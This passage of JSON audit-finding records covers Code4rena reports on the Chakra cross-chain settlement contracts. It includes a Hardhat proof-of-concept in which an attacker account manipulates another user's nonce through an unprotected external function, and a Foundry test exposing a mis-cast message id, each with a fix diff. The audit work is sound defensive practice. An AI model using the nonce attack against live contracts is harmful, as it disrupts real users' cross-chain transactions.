"https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L111\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L111\n\n\n# Vulnerability details\n\n## Impact\nThere is a problem that Anyone can increase another handler contract nonce (nonce_manager) in settlement contract.\n\nnonce_manager is used to make ```txid```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L139-L150\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L122-L133\n```\n        {\n            // Increment nonce for the sender\n            nonce_manager[msg.sender] += 1;\n        }\n\n        uint256 txid = uint256(\n            keccak256(\n                abi.encodePacked(\n                    chain,\n                    to_chain,\n                    msg.sender, // from address for settlement to calculate txid\n                    address(this), //  from handler for settlement to calculate txid\n                    to_handler,\n                    nonce_manager[msg.sender]\n                )\n            )\n        );\n```\n\n```txid``` is generated using several arguments and the ```nonce_manager[msg.sender]``` value as shown above.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L212-L222\n```\n        emit CrossChainLocked(\n            txid,\n            msg.sender,\n            to,\n            chain,\n            to_chain,\n            address(this),\n            to_token,\n            amount,\n            mode\n        );\n```\nThe handler function emits the corresponding ```txid``` value as an event.\n\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L203-L209\n```\n///Handler code\n            // Send the cross chain msg\n            settlement.send_cross_chain_msg(\n                to_chain,\n                msg.sender,\n                to_handler,\n                PayloadType.ERC20,\n                cross_chain_msg_bytes\n            );\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L118-L133\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L146-L155\n```\n///Settlement code\n        nonce_manager[from_address] += 1;\n\n        address from_handler = msg.sender;\n\n        uint256 txid = uint256(\n            keccak256(\n                abi.encodePacked(\n                    contract_chain_name, // from chain\n                    to_chain,\n                    from_address, // msg.sender address\n                    from_handler, // settlement handler address\n                    to_handler,\n                    nonce_manager[from_address]\n                )\n            )\n        );\n\n        emit CrossChainMsg(\n            txid,\n            from_address,\n            contract_chain_name,\n            to_chain,\n            from_handler,\n            to_handler,\n            payload_type,\n            payload\n        );\n```\n\nBefore the event emit, the handler function calls ```settlement.send_cross_chain_msg```. The ```send_cross_chain_msg``` function of settlement also creates a ```txid``` and emits an event using this ```txid```.\n\n\nThrough this process, the handler contract and the settlement contract emit the same ```txid``` event.\n\nThe system processes this emitted ```txid``` to handle the task.\n\nHowever, there is a vulnerability that allows anyone to manipulate the ```nonce_manager``` value used when generating ```txid``` in the settlement contract with someone else's ```nonce_manager``` value, which can cause confusion in the system.\n\n\n\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L139-L150\n```\n        uint256 txid = uint256(\n            keccak256(\n                abi.encodePacked(\n                    chain,\n                    to_chain,\n                    msg.sender, // from address for settlement to calculate txid\n                    address(this), //  from handler for settlement to calculate txid\n                    to_handler,\n                    nonce_manager[msg.sender]\n                )\n            )\n        );\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L203-L209\n```\n            // Send the cross chain msg\n            settlement.send_cross_chain_msg(\n                to_chain,\n                msg.sender,\n                to_handler,\n                PayloadType.ERC20,\n                cross_chain_msg_bytes\n            );\n```\nWhen the ```cross_chain_erc20_settlement``` function is called in the handler contract, a ```txid``` is generated and the ```send_cross_chain_msg``` function of the settlement contract is called.\n\n```\n    function send_cross_chain_msg(\n        string memory to_chain,\n        address from_address,\n        uint256 to_handler,\n        PayloadType payload_type,\n        bytes calldata payload\n    ) external {\n        nonce_manager[from_address] += 1;\n\n        address from_handler = msg.sender;\n\n        uint256 txid = uint256(\n            keccak256(\n                abi.encodePacked(\n                    contract_chain_name, // from chain\n                    to_chain,\n                    from_address, // msg.sender address\n                    from_handler, // settlement handler address\n                    to_handler,\n                    nonce_manager[from_address]\n                )\n            )\n        );\n```\nIn the ```send_cross_chain_msg``` function of the settlement contract, the ```from_address``` argument is set to the address of the user who called the ```cross_chain_erc20_settlement``` function of the handler set in the handler, the nonce value of the address is increased, and a ```txid``` is generated.\n\nHere, the ```send_cross_chain_msg``` function is defined as external, so it is a function that can be called by outsiders, and since there is no other access control when increasing the nonce of ```from_address``` in ```nonce_manager```, anyone can increase the nonce of a specific user's settlement contract.\n\nThis can cause an imbalance between the handler's nonce and the settlement's nonce, potentially causing system confusion.\n\nAlso, if the same user of another handler calls the ```cross_chain_erc20_settlement``` function, a mismatch between the user nonce of the handler and the settlement will occur.\n\n## Test\n```\n    it('Test Manipulate another settlement contract user nonce', async () => {\n        const [\n            sender,\n            receiver,\n            attacker,\n        ] = await hre.ethers.getSigners();\n        const { tokenInstance, tokenOperator, codecInstance, settlmentInstance, tokenOwner, settlementHandlerInstance, settlementHnadlerOwner, messageLibTestInstance } = await loadFixture(deploySettlementHandlerFixtureMintBurn);\n\n        const senderAddress = await sender.getAddress()\n        const receiverAddress = await receiver.getAddress()\n        const settlementHandlerAddress = await settlementHandlerInstance.getAddress()\n        const totalAmount = 1000000;\n        await tokenInstance.connect(tokenOperator).mint_to(sender, totalAmount);\n\n\n        const toChain = \"dst\"\n        const toHandler = 1\n        const toToken = 1\n        const receiverAddressU256 = hre.ethers.toBigInt(Buffer.from(receiverAddress.slice(2), 'hex'))\n        const amount = 1000\n\n        await tokenInstance.connect(sender).approve(settlementHandlerAddress, 1000)\n\n        const tx = await settlementHandlerInstance.connect(sender).cross_chain_erc20_settlement(\n            toChain,\n            toHandler,\n            toToken,\n            receiverAddressU256,\n            amount\n        )\n        const nonceBefore = await settlmentInstance.nonce_manager(senderAddress);\n        console.log(\"Nonce value in settlement contract before attack:\", nonceBefore.toString());\n\n        const payloadType = 5; // Assuming a payload type, e.g., for an ERC20 transfer\n        const payload = \"0x616263\"; // Example payload data (\"abc\" in hex)\n        await(settlmentInstance.connect(attacker).send_cross_chain_msg(\n            toChain,\n            senderAddress, // sender address to target\n            toHandler,\n            payloadType,\n            payload,\n        ));\n        const nonceAfter = await settlmentInstance.nonce_manager(senderAddress);\n        console.log(\"Nonce value in settlement contract after attack:\", nonceAfter.toString());\n\n        const handlerNonce = await settlementHandlerInstance.nonce_manager(senderAddress);\n        console.log(\"Handler Contract User Nonce: \", handlerNonce.toString());\n        expect(nonceAfter).to.be.not.equal(handlerNonce);\n\n    });\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/test/ChakraSettlementHandler.ts\nwrite test code in ```ChakraSettlementHandler.ts``` file\n\nThis test code tests whether the sender's (user's) nonce value has been manipulated by the Attacker.\n\n### Test log\n```\nChakraSettlementHandler\n    _ Should work in MintBurn mode (1238ms)\nNonce value in settlement contract before attack: 1\nNonce value in settlement contract after attack: 2\nHandler Contract User Nonce:  1\n```\n\n## Tools Used\nvscode, Manual Review\n\n## Recommended Mitigation Steps\nSet the nonce value in the settlement contract to be managed by ```from_handler```\n\n```\ndiff --git a/solidity/settlement/contracts/BaseSettlement.sol b/solidity/settlement/contracts/BaseSettlement.sol\nindex 7ac72a2..bd2ce00 100644\n--- a/solidity/settlement/contracts/BaseSettlement.sol\n+++ b/solidity/settlement/contracts/BaseSettlement.sol\n@@ -38,7 +38,8 @@ abstract contract BaseSettlement is\n     ISettlementSignatureVerifier public signature_verifier;\n\n     // Mapping for nonce manager and validators\n-    mapping(address => uint256) public nonce_manager;\n+    //mapping(address => uint256) public nonce_manager;\n+    mapping(address => mapping(address => uint256)) public nonce_manager;\n     mapping(address => bool) public chakra_validators;\n     uint256 public validator_count;\n\ndiff --git a/solidity/settlement/contracts/ChakraSettlement.sol b/solidity/settlement/contracts/ChakraSettlement.sol\nindex ad764f2..4c2b0c5 100644\n--- a/solidity/settlement/contracts/ChakraSettlement.sol\n+++ b/solidity/settlement/contracts/ChakraSettlement.sol\n@@ -115,9 +115,10 @@ contract ChakraSettlement is BaseSettlement {\n         PayloadType payload_type,\n         bytes calldata payload\n     ) external {\n-        nonce_manager[from_address] += 1;\n+        // nonce_manager[from_address] += 1;\n\n         address from_handler = msg.sender;\n+        nonce_manager[from_handler][from_address] += 1;\n\n         uint256 txid = uint256(\n             keccak256(\n```\n\nModify nonce_manager as in the code above so that the user's nonce_manager can increase according to the handler.\n\nThis operation prevents an attacker from manipulating someone else's nonce by pretending to be a handler, and also prevents nonce collisions between other normal handlers.\n\n\n## Assessed type\n\nAccess Control\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L111\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L111\n\n\n# Vulnerability details\n\n## Impact\nThere is a problem that Anyone can increase another handler contract nonce (nonce_manager) in settlement contract.\n\nnonce_manager is used to make ```txid```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L139-L150\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L122-L133\n```\n        {\n            // Increment nonce for the sender\n            nonce_manager[msg.sender] += 1;\n        }\n\n        uint256 txid = uint256(\n            keccak256(\n                abi.encodePacked(\n                    chain,\n                    to_chain,\n                    msg.sender, // from address for settlement to calculate txid\n                    address(this), //  from handler for settlement to calculate txid\n                    to_handler,\n                    nonce_manager[msg.sender]\n                )\n            )\n        );\n```\n\n```txid``` is generated using several arguments and the ```nonce_manager[msg.sender]``` value as shown above.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L212-L222\n```\n        emit CrossChainLocked(\n            txid,\n            msg.sender,\n            to,\n            chain,\n            to_chain,\n            address(this),\n            to_token,\n            amount,\n            mode\n        );\n```\nThe handler function emits the corresponding ```txid``` value as an event.\n\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L203-L209\n```\n///Handler code\n            // Send the cross chain msg\n            settlement.send_cross_chain_msg(\n                to_chain,\n                msg.sender,\n                to_handler,\n                PayloadType.ERC20,\n                cross_chain_msg_bytes\n            );\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L118-L133\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L146-L155\n```\n///Settlement code\n        nonce_manager[from_address] += 1;\n\n        address from_handler = msg.sender;\n\n        uint256 txid = uint256(\n            keccak256(\n                abi.encodePacked(\n                    contract_chain_name, // from chain\n                    to_chain,\n                    from_address, // msg.sender address\n                    from_handler, // settlement handler address\n                    to_handler,\n                    nonce_manager[from_address]\n                )\n            )\n        );\n\n        emit CrossChainMsg(\n            txid,\n            from_address,\n            contract_chain_name,\n            to_chain,\n            from_handler,\n            to_handler,\n            payload_type,\n            payload\n        );\n```\n\nBefore the event emit, the handler function calls ```settlement.send_cross_chain_msg```. The ```send_cross_chain_msg``` function of settlement also creates a ```txid``` and emits an event using this ```txid```.\n\n\nThrough this process, the handler contract and the settlement contract emit the same ```txid``` event.\n\nThe system processes this emitted ```txid``` to handle the task.\n\nHowever, there is a vulnerability that allows anyone to manipulate the ```nonce_manager``` value used when generating ```txid``` in the settlement contract with someone else's ```nonce_manager``` value, which can cause confusion in the system.\n\n\n\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L139-L150\n```\n        uint256 txid = uint256(\n            keccak256(\n                abi.encodePacked(\n                    chain,\n                    to_chain,\n                    msg.sender, // from address for settlement to calculate txid\n                    address(this), //  from handler for settlement to calculate txid\n                    to_handler,\n                    nonce_manager[msg.sender]\n                )\n            )\n        );\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L203-L209\n```\n            // Send the cross chain msg\n            settlement.send_cross_chain_msg(\n                to_chain,\n                msg.sender,\n                to_handler,\n                PayloadType.ERC20,\n                cross_chain_msg_bytes\n            );\n```\nWhen the ```cross_chain_erc20_settlement``` function is called in the handler contract, a ```txid``` is generated and the ```send_cross_chain_msg``` function of the settlement contract is called.\n\n```\n    function send_cross_chain_msg(\n        string memory to_chain,\n        address from_address,\n        uint256 to_handler,\n        PayloadType payload_type,\n        bytes calldata payload\n    ) external {\n        nonce_manager[from_address] += 1;\n\n        address from_handler = msg.sender;\n\n        uint256 txid = uint256(\n            keccak256(\n                abi.encodePacked(\n                    contract_chain_name, // from chain\n                    to_chain,\n                    from_address, // msg.sender address\n                    from_handler, // settlement handler address\n                    to_handler,\n                    nonce_manager[from_address]\n                )\n            )\n        );\n```\nIn the ```send_cross_chain_msg``` function of the settlement contract, the ```from_address``` argument is set to the address of the user who called the ```cross_chain_erc20_settlement``` function of the handler set in the handler, the nonce value of the address is increased, and a ```txid``` is generated.\n\nHere, the ```send_cross_chain_msg``` function is defined as external, so it is a function that can be called by outsiders, and since there is no other access control when increasing the nonce of ```from_address``` in ```nonce_manager```, anyone can increase the nonce of a specific user's settlement contract.\n\nThis can cause an imbalance between the handler's nonce and the settlement's nonce, potentially causing system confusion.\n\nAlso, if the same user of another handler calls the ```cross_chain_erc20_settlement``` function, a mismatch between the user nonce of the handler and the settlement will occur.\n\n## Test\n```\n    it('Test Manipulate another settlement contract user nonce', async () => {\n        const [\n            sender,\n            receiver,\n            attacker,\n        ] = await hre.ethers.getSigners();\n        const { tokenInstance, tokenOperator, codecInstance, settlmentInstance, tokenOwner, settlementHandlerInstance, settlementHnadlerOwner, messageLibTestInstance } = await loadFixture(deploySettlementHandlerFixtureMintBurn);\n\n        const senderAddress = await sender.getAddress()\n        const receiverAddress = await receiver.getAddress()\n        const settlementHandlerAddress = await settlementHandlerInstance.getAddress()\n        const totalAmount = 1000000;\n        await tokenInstance.connect(tokenOperator).mint_to(sender, totalAmount);\n\n\n        const toChain = \"dst\"\n        const toHandler = 1\n        const toToken = 1\n        const receiverAddressU256 = hre.ethers.toBigInt(Buffer.from(receiverAddress.slice(2), 'hex'))\n        const amount = 1000\n\n        await tokenInstance.connect(sender).approve(settlementHandlerAddress, 1000)\n\n        const tx = await settlementHandlerInstance.connect(sender).cross_chain_erc20_settlement(\n            toChain,\n            toHandler,\n            toToken,\n            receiverAddressU256,\n            amount\n        )\n        const nonceBefore = await settlmentInstance.nonce_manager(senderAddress);\n        console.log(\"Nonce value in settlement contract before attack:\", nonceBefore.toString());\n\n        const payloadType = 5; // Assuming a payload type, e.g., for an ERC20 transfer\n        const payload = \"0x616263\"; // Example payload data (\"abc\" in hex)\n        await(settlmentInstance.connect(attacker).send_cross_chain_msg(\n            toChain,\n            senderAddress, // sender address to target\n            toHandler,\n            payloadType,\n            payload,\n        ));\n        const nonceAfter = await settlmentInstance.nonce_manager(senderAddress);\n        console.log(\"Nonce value in settlement contract after attack:\", nonceAfter.toString());\n\n        const handlerNonce = await settlementHandlerInstance.nonce_manager(senderAddress);\n        console.log(\"Handler Contract User Nonce: \", handlerNonce.toString());\n        expect(nonceAfter).to.be.not.equal(handlerNonce);\n\n    });\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/test/ChakraSettlementHandler.ts\nwrite test code in ```ChakraSettlementHandler.ts``` file\n\nThis test code tests whether the sender's (user's) nonce value has been manipulated by the Attacker.\n\n### Test log\n```\nChakraSettlementHandler\n    _ Should work in MintBurn mode (1238ms)\nNonce value in settlement contract before attack: 1\nNonce value in settlement contract after attack: 2\nHandler Contract User Nonce:  1\n```\n\n## Tools Used\nvscode, Manual Review\n\n## Recommended Mitigation Steps\nSet the nonce value in the settlement contract to be managed by ```from_handler```\n\n```\ndiff --git a/solidity/settlement/contracts/BaseSettlement.sol b/solidity/settlement/contracts/BaseSettlement.sol\nindex 7ac72a2..bd2ce00 100644\n--- a/solidity/settlement/contracts/BaseSettlement.sol\n+++ b/solidity/settlement/contracts/BaseSettlement.sol\n@@ -38,7 +38,8 @@ abstract contract BaseSettlement is\n     ISettlementSignatureVerifier public signature_verifier;\n\n     // Mapping for nonce manager and validators\n-    mapping(address => uint256) public nonce_manager;\n+    //mapping(address => uint256) public nonce_manager;\n+    mapping(address => mapping(address => uint256)) public nonce_manager;\n     mapping(address => bool) public chakra_validators;\n     uint256 public validator_count;\n\ndiff --git a/solidity/settlement/contracts/ChakraSettlement.sol b/solidity/settlement/contracts/ChakraSettlement.sol\nindex ad764f2..4c2b0c5 100644\n--- a/solidity/settlement/contracts/ChakraSettlement.sol\n+++ b/solidity/settlement/contracts/ChakraSettlement.sol\n@@ -115,9 +115,10 @@ contract ChakraSettlement is BaseSettlement {\n         PayloadType payload_type,\n         bytes calldata payload\n     ) external {\n-        nonce_manager[from_address] += 1;\n+        // nonce_manager[from_address] += 1;\n\n         address from_handler = msg.sender;\n+        nonce_manager[from_handler][from_address] += 1;\n\n         uint256 txid = uint256(\n             keccak256(\n```\n\nModify nonce_manager as in the code above so that the user's nonce_manager can increase according to the handler.\n\nThis operation prevents an attacker from manipulating someone else's nonce by pretending to be a handler, and also prevents nonce collisions between other normal handlers.\n\n\n## Assessed type\n\nAccess Control"}, "severity": "High", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "High"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-159", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 159, "page_start": null, "title": "MessageV1Codec: Reading the id of msg will return a wrong id", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/libraries/MessageV1Codec.sol#L76-L78\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/MessageV1Codec.sol#L56-L58\n\n\n# Vulnerability details\n\n## Impact\nInside of the library `MessageV1Codec` used inside the [solidity handler](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/libraries/MessageV1Codec.sol) and [solidity settlement](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/libraries/MessageV1Codec.sol) contracts, the library function will read the id of a msg from the encoded bytes.\n\nThe function is not implemented correctly. The issue is caused by the incorrect casting of the sliced part of the msg to an byte8, as the sliced part is 32 bytes long. This casting will only look at the first 8 bits. This means that it will return 0 for any id that does not use those highest 8 bits (number is less than type(uint248).max). For numbers greater than this, it will return the integer value of those 8 bits. This will not match the correct id.\n\nThis would lead to issues for any contract that relies on reading the msg id. As library code is intended to be reused in many places, it is especially important to have no issues in those. As later contracts might also use those library, the possible damage can not be estimated directly by the current usage. Therefor the issue should be considered a high risk.\n\n\n## Proof of Concept\nLooking at [function id](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/libraries/MessageV1Codec.sol#L76-L78):\n\nAn example msg would be: `Message(1, PayloadType.Raw, \"0x1234\")`. The encoded bytes would be: `0x01000000000000000000000000000000000000000000000000000000000000000100307831323334`. The function first slices the correct part of the msg by doing `_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]`. This will return `0000000000000000000000000000000000000000000000000000000000000001` for this example. By casting it to a byte8 next, it will be `00` and the function will return 0.\n\nBelow is a poc in foundry. The test creates a helper contract that uses the library to read the id from an encoded msg. In the `test_readID` test, it creates a msg with id 1. It encodes the msg and calls the helper function to read the id. The test will fail as the returned number is zero and not one.\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\nimport {MessageV1Codec} from \"../contracts/libraries/MessageV1Codec.sol\";\nimport {Message, PayloadType} from \"../contracts/libraries/Message.sol\";\n\ncontract Helper {\n    function readID(bytes calldata encoded) public returns (uint64) {\n        return MessageV1Codec.id(encoded);\n    }\n}\n\ncontract POCTest is Test {\n    Helper h;\n\n    function setUp() public {\n        h = new Helper();\n    }\n\n    function test_readID() public {\n        Message memory test_msg = Message(1, PayloadType.Raw, \"0x1234\");\n        bytes memory encoded = MessageV1Codec.encode(test_msg);\n        assertEq(h.readID(encoded), test_msg.id);\n    }\n}\n```\n\n## Tools Used\nmanual review\n\n## Recommended Mitigation Steps\nThe library assumes the id is of type uint64. Change the function to use the correct size of uint256 as defined in the [Message type](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/libraries/Message.sol#L23-L30). For example like this:\n```diff\n--- a/MessageV1Codec.sol.orig\n+++ b/MessageV1Codec.sol\n@@ -53,8 +53,8 @@ library MessageV1Codec {\n         return uint8(bytes1(_msg[PACKET_VERSION_OFFSET:ID_OFFSET]));\n     }\n\n-    function id(bytes calldata _msg) internal pure returns (uint64) {\n-        return uint64(bytes8(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n+    function id(bytes calldata _msg) internal pure returns (uint256) {\n+        return uint256(bytes32(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n     }\n\n     function payload_type(\n```\n\n\n\n## Assessed type\n\nen/de-code\n", "sections": {"description_md": null, "impact_md": "## Impact\nInside of the library `MessageV1Codec` used inside the [solidity handler](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/libraries/MessageV1Codec.sol) and [solidity settlement](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/libraries/MessageV1Codec.sol) contracts, the library function will read the id of a msg from the encoded bytes.\n\nThe function is not implemented correctly. The issue is caused by the incorrect casting of the sliced part of the msg to an byte8, as the sliced part is 32 bytes long. This casting will only look at the first 8 bits. This means that it will return 0 for any id that does not use those highest 8 bits (number is less than type(uint248).max). For numbers greater than this, it will return the integer value of those 8 bits. This will not match the correct id.\n\nThis would lead to issues for any contract that relies on reading the msg id. As library code is intended to be reused in many places, it is especially important to have no issues in those. As later contracts might also use those library, the possible damage can not be estimated directly by the current usage. Therefor the issue should be considered a high risk.\n", "recommendation_md": "## Recommended Mitigation Steps\nThe library assumes the id is of type uint64. Change the function to use the correct size of uint256 as defined in the [Message type](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/libraries/Message.sol#L23-L30). For example like this:\n```diff\n--- a/MessageV1Codec.sol.orig\n+++ b/MessageV1Codec.sol\n@@ -53,8 +53,8 @@ library MessageV1Codec {\n         return uint8(bytes1(_msg[PACKET_VERSION_OFFSET:ID_OFFSET]));\n     }\n\n-    function id(bytes calldata _msg) internal pure returns (uint64) {\n-        return uint64(bytes8(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n+    function id(bytes calldata _msg) internal pure returns (uint256) {\n+        return uint256(bytes32(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n     }\n\n     function payload_type(\n```\n\n\n\n## Assessed type\n\nen/de-code\n", "poc_md": "## Proof of Concept\nLooking at [function id](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/libraries/MessageV1Codec.sol#L76-L78):\n\nAn example msg would be: `Message(1, PayloadType.Raw, \"0x1234\")`. The encoded bytes would be: `0x01000000000000000000000000000000000000000000000000000000000000000100307831323334`. The function first slices the correct part of the msg by doing `_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]`. This will return `0000000000000000000000000000000000000000000000000000000000000001` for this example. By casting it to a byte8 next, it will be `00` and the function will return 0.\n\nBelow is a poc in foundry. The test creates a helper contract that uses the library to read the id from an encoded msg. In the `test_readID` test, it creates a msg with id 1. It encodes the msg and calls the helper function to read the id. The test will fail as the returned number is zero and not one.\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\nimport {MessageV1Codec} from \"../contracts/libraries/MessageV1Codec.sol\";\nimport {Message, PayloadType} from \"../contracts/libraries/Message.sol\";\n\ncontract Helper {\n    function readID(bytes calldata encoded) public returns (uint64) {\n        return MessageV1Codec.id(encoded);\n    }\n}\n\ncontract POCTest is Test {\n    Helper h;\n\n    function setUp() public {\n        h = new Helper();\n    }\n\n    function test_readID() public {\n        Message memory test_msg = Message(1, PayloadType.Raw, \"0x1234\");\n        bytes memory encoded = MessageV1Codec.encode(test_msg);\n        assertEq(h.readID(encoded), test_msg.id);\n    }\n}\n```\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/libraries/MessageV1Codec.sol#L76-L78\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/MessageV1Codec.sol#L56-L58\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nmanual review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/libraries/MessageV1Codec.sol#L76-L78\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/MessageV1Codec.sol#L56-L58\n\n\n# Vulnerability details\n\n## Impact\nInside of the library `MessageV1Codec` used inside the [solidity handler](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/libraries/MessageV1Codec.sol) and [solidity settlement](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/libraries/MessageV1Codec.sol) contracts, the library function will read the id of a msg from the encoded bytes.\n\nThe function is not implemented correctly. The issue is caused by the incorrect casting of the sliced part of the msg to an byte8, as the sliced part is 32 bytes long. This casting will only look at the first 8 bits. This means that it will return 0 for any id that does not use those highest 8 bits (number is less than type(uint248).max). For numbers greater than this, it will return the integer value of those 8 bits. This will not match the correct id.\n\nThis would lead to issues for any contract that relies on reading the msg id. As library code is intended to be reused in many places, it is especially important to have no issues in those. As later contracts might also use those library, the possible damage can not be estimated directly by the current usage. Therefor the issue should be considered a high risk.\n\n\n## Proof of Concept\nLooking at [function id](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/libraries/MessageV1Codec.sol#L76-L78):\n\nAn example msg would be: `Message(1, PayloadType.Raw, \"0x1234\")`. The encoded bytes would be: `0x01000000000000000000000000000000000000000000000000000000000000000100307831323334`. The function first slices the correct part of the msg by doing `_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]`. This will return `0000000000000000000000000000000000000000000000000000000000000001` for this example. By casting it to a byte8 next, it will be `00` and the function will return 0.\n\nBelow is a poc in foundry. The test creates a helper contract that uses the library to read the id from an encoded msg. In the `test_readID` test, it creates a msg with id 1. It encodes the msg and calls the helper function to read the id. The test will fail as the returned number is zero and not one.\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\nimport {MessageV1Codec} from \"../contracts/libraries/MessageV1Codec.sol\";\nimport {Message, PayloadType} from \"../contracts/libraries/Message.sol\";\n\ncontract Helper {\n    function readID(bytes calldata encoded) public returns (uint64) {\n        return MessageV1Codec.id(encoded);\n    }\n}\n\ncontract POCTest is Test {\n    Helper h;\n\n    function setUp() public {\n        h = new Helper();\n    }\n\n    function test_readID() public {\n        Message memory test_msg = Message(1, PayloadType.Raw, \"0x1234\");\n        bytes memory encoded = MessageV1Codec.encode(test_msg);\n        assertEq(h.readID(encoded), test_msg.id);\n    }\n}\n```\n\n## Tools Used\nmanual review\n\n## Recommended Mitigation Steps\nThe library assumes the id is of type uint64. Change the function to use the correct size of uint256 as defined in the [Message type](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/libraries/Message.sol#L23-L30). For example like this:\n```diff\n--- a/MessageV1Codec.sol.orig\n+++ b/MessageV1Codec.sol\n@@ -53,8 +53,8 @@ library MessageV1Codec {\n         return 